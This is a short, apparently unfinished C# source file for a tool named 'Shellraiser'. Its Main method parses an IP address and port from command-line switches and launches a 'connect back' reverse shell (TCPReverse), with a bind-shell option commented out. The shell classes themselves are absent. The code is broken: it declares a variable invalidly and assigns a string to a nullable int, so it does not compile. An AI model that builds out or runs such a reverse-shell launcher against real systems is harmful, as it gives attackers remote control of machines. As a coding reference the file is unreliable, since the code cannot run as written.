using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Shellraiser
{
    class ShellRunner
    {
        public static void Main(string[] args)
        {
            var IPAddress = string.Empty;
            var int? Port = 0;
            for (var x = 0; x < args.Count(); x++)
            {
                switch (args[x].Trim().ToUpper())
                {
                    // We need to get this so that we can put the IP and the Port numbers. Look ath the TCP client and see how we're parsing IP addresses there
                      
                    case "/I":
                        IPAddress = args[x + 1];
                        break;
                    case "/P":
                        Port = args[x + 1];
                        break;
                    case "/R":
                        // Start connect back method TCPReverse using IPAddress and Port
                        TCPReverse reverse = new(IPAddress, Port);
                        break;
                        /*                    case "/B":
                                                // Start TCPBind method and listen on given IPAddress and Port
                                                TCPBind bind = new(IPAddress, Port);
                                                break;*/
                }
            }
        }
    }
}






  